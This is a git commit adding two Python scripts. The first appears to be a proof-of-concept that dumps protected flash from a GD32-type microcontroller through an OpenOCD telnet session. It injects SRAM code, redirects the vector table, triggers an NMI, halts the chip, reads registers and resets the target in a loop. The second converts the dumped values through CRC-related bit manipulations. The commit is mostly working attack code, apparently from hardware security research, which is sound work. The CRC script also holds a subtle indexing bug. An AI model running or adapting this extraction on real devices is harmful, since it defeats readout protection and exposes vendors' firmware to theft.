7445500b0bd7502c70889db9c0054740a9f6f0a3
Yakerone <47002890+Yakerone@users.noreply.github.com>
2024-04-14 11:50:27 +0200

    Add files via upload
    - added script for D1 PoC
    - added script for the GD32-CRC

---
+++ cmds.py
@@ -0,0 +1,125 @@
+﻿from subprocess import Popen, PIPE, STDOUT
+import time
+import telnetlib
+import serial
+
+ser = serial.Serial("/dev/serial/port1", 115200)
+
+
+# Telnetstuff
+host = 'localhost'
+port = 4444
+
+tn = telnetlib.Telnet(host, port)
+
+def tnwrite(cmd):
+    tn.write(b""+cmd+"\n")
+
+def tnread():
+    return tn.read_very_eager()
+
+# Commands for on off
+cmdoff = f'sudo uhubctl -a off -p 1-5 -r 5'
+cmdon = f'sudo uhubctl -a on -p 1-5'
+
+# Uses uhubctl to reset the target
+def sendUhubctlCmd(cmd):
+    with Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, text=True) as process:
+        # Wait for the command to complete and collect its output
+        stdout, stderr = process.communicate()
+        # Optionally, you can check the exit code and print the output
+        if process.returncode == 0:
+            print('Command succeeded:')
+            print(stdout)
+        else:
+            print('Command failed:')
+            print(stderr)
+
+# Resets USB
+def cycleUSB():
+    sendUhubctlCmd(cmdoff)
+    time.sleep(5)
+    sendUhubctlCmd(cmdon)
+    time.sleep(2)
+
+def toggleReset():
+    ser.write(b"2")
+    time.sleep(2)
+
+def startDev():
+    ser.write(b"1")
+
+def stopDev():
+    ser.write(b"0")
+
+def calcAddress(addr, val):
+     return  hex(int(addr, 16) + int(val, 16))[2:].zfill(8)
+
+def multAddPart(val, i):
+    return hex(int(val, 16) * i)[2:].zfill(5)
+
+def divHex(a, b):
+    return int(int(a, 16) / int(b, 16))
+
+def bcmd(c, a="", b=""):
+    sp1 = "" if a == "" else " "
+    sp2 = "" if b == "" else " "
+    return c + sp1 + a + sp2 + b + ";"
+
+def getAddressset(base):
+    return [
+        calcAddress(base,  '0x00'),
+        calcAddress(base,  '0x04'),
+        calcAddress(base,  '0x08'),
+        calcAddress(base,  '0x0C'),
+        calcAddress(base,  '0x10')
+    ]
+
+def makeNextCommands(addressset):
+    return [
+        bcmd('mww', '0x'+addressset[0], '0x20002104'),
+        bcmd('mww', '0x'+addressset[1], '0x2208230C'),
+        bcmd('mww', '0x'+addressset[2], '0x68006809'),
+        bcmd('mww', '0x'+addressset[3], '0x68126818'),
+        bcmd('mww', '0x'+addressset[4], '0xFFFFFFFF')
+    ]
+
+def sendCmd(cmd):
+    tnwrite(cmd)
+
+def prepCmds(c):
+    cmds = [
+        bcmd('mww', '0xe000ed08', '0x20000000'),
+        bcmd('mww', '0x20000008', '0x20000021')
+    ]
+    for i in range(0, len(c)):
+        cmds.append(c[i])
+    cmds.append(bcmd('mww', '0xe000ed04', '0x80000000'))
+    cmds.append(bcmd('halt'))
+    cmds.append(bcmd('reg','r0'))
+    cmds.append(bcmd('reg','r1'))
+    cmds.append(bcmd('reg','r2'))
+    cmds.append(bcmd('reg','r3'))
+    return cmds
+    
+def extract():
+    a = '0x20000000'
+    b = '0x10'
+    # 8192 *  16 Byte ( 4 Words == 8 Halfwords == 8 * 2 Byte == 16 Byte)
+    # 131072Byte / 16Byte 
+    # 128kb / 16kb per round
+    cycles = divHex('0x20000', b)
+    for i in range(1, cycles):
+        c = multAddPart(b, i)
+        d = calcAddress(a, c)
+        f = getAddressset(d)
+        g = makeNextCommands(f)
+        h = prepCmds(g)
+        for i in range(0, len(h)):
+            sendCmd(h[i])
+        print(tnread())
+        #cycleUSB()
+        toggleReset()
+        
+    
+extract()
---
+++ crcgd32-2.py
@@ -0,0 +1,161 @@
+﻿import sys
+
+def clearFile(t):
+    with open(t, "r") as fl:
+        cntnt = fl.read()
+        rows = cntnt.split("\n")
+        if len(rows) > 1:
+            octets = []
+            for i in range(0, len(rows)):
+                n = rows[i].split(" ")
+                for j in range(0, len(n)):
+                    octets.append(n[i])
+            return octets
+        else:
+            return cntnt.split(" ")
+
+def rev(bin):
+    rT = ""
+    for i in range(0, len(bin)):
+        rT = bin[i] + rT
+    return rT
+
+def inv(bin):
+    rT = ""
+    for i in range(0, len(bin)):
+        a = "0"
+        if bin[i] == "0":
+            a = "1"
+        rT += a
+    return rT
+
+def h2hb(h):
+    if h[1] == "x" or h[1] == "X":
+        h = h[2:]
+    r = ""
+    for i in range(0, int(len(h)/2)):
+        k = i * 2
+        r += h[k:k+2]
+        if i < int(len(h)/2) - 1:
+            r += " "
+    return r.split(" ")
+
+def h2hhlfw(h):
+    if h[1] == "x" or h[1] == "X":
+        h = h[2:]
+    r = ""
+    for i in range(0, int(len(h)/4)):
+        k = i * 4
+        r += h[k:k+4]
+        if i < int(len(h)/4) - 1:
+            r += " "
+    return r.split(" ")
+
+def h2hw(h):
+    if h[1] == "x" or h[1] == "X":
+        h = h[2:]
+    r = ""
+    for i in range(0, int(len(h)/8)):
+        k = i * 8
+        r += h[k:k+8]
+        if i < int(len(h)/8) - 1:
+            r += " "
+    return r.split(" ")
+
+def hb2bin8(hb):
+    r = ""
+    for i in range(0, len(hb)):
+        r += bin(int(hb[i], 16))[2:].zfill(8)
+        if i < len(hb) - 1:
+            r += " "
+    return r.split()
+
+def hhlfw2bin16(hb):
+    r = ""
+    for i in range(0, len(hb)):
+        r += bin(int(hb[i], 16))[2:].zfill(16)
+        if i < len(hb) - 1:
+            r += " "
+    return r.split()
+
+def hw2bin32(hb):
+    r = ""
+    for i in range(0, len(hb)):
+        r += bin(int(hb[i], 16))[2:].zfill(32)
+        if i < len(hb) - 1:
+            r += " "
+    return r.split()
+
+def revBinBytes(binbytes):
+    rT = ""
+    for i in range(0, len(binbytes)):
+        rT += str(rev(binbytes[i]))
+        if i < len(binbytes) - 1:
+            rT += " "
+    return rT.split(" ")
+
+def invBinHlfw(binhlfw):
+    rT = ""
+    for i in range(0, len(binhlfw)):
+        rT += switchHbInHhlfw(binhlfw[i])
+        if i < len(binhlfw) - 1:
+            rT += " "
+    return rT.split(" ")
+
+def bb2hb(bb):
+    rT = ""
+    for i in range(0, len(bb)):
+        rT += hex(int(bb[i],2))[2:]
+        if i < len(bb) - 1:
+            rT += " "
+    return rT.split(" ")
+
+def hb2h(hb):
+    rT = ""
+    for i in range(0, len(hb)):
+        rT += ""+hb[i]
+    return rT
+
+def hb2hInvW(hb):
+    rT = ""
+    for i in range(0, len(hb)):
+        rT = ""+hb[i] + rT
+    return rT
+
+def switchHbInHhlfw(hhlfw):
+    return  hhlfw[8:16:] + "" + hhlfw[0:8]
+
+def xor(val):
+    rT = ""
+    l = int(val, 16) ^ int('FFFFFFFF',16)
+    return hex(l)[2:]
+
+def pf(octets):
+    r = ""
+    for i in range(0, len(octets)):
+        #a = "0x1a2b3c4d"
+        #a = "0x11223344"
+        b = h2hb(octets[i])
+        c = hb2bin8(b)
+        d = revBinBytes(c)
+        e = bb2hb(d)
+        f = hb2h(e)
+        g = h2hhlfw(f)
+        h = hhlfw2bin16(g)
+        ii = invBinHlfw(h)
+        j = bb2hb(ii)
+        p = hb2hInvW(j)
+        s = hex(bin(int(p, 16))[2:].zfill(32))[2:]
+        t = xor(s)
+        r += t
+        if i < len(octets) - 1:
+            r += " "
+    return r
+
+a = sys.argv[1]
+r = ""
+if a != "":
+    r = clearFile(a)
+    print(pf(r)) 
+  
+
